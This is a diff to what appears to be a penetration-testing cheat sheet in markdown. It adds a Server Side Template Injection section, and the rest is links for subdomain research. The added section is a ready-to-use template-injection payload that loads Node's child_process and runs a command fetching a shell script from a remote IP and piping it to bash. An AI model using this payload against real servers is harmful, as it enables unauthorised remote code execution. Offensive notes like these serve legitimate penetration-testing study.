@@ -1,4 +1,5 @@
 - [Web hacking](#web-hacking)
+  - [Server Side Template Injection](#server-side-template-injection)
   - [Subdomain](#subdomain)
   - [Wildcards](#wildcards)
   - [User enumeration](#user-enumeration)
@@ -24,6 +25,12 @@
   - [Decoder, Comparer, Sequencer](#decoder-comparer-sequencer)
 
 # Web hacking
+
+## Server Side Template Injection
+#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.9.1.255:5556/s.sh | bash')}()}
+
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+
 ## Subdomain
 - search certificates: 
   - https://transparencyreport.google.com/https/overview
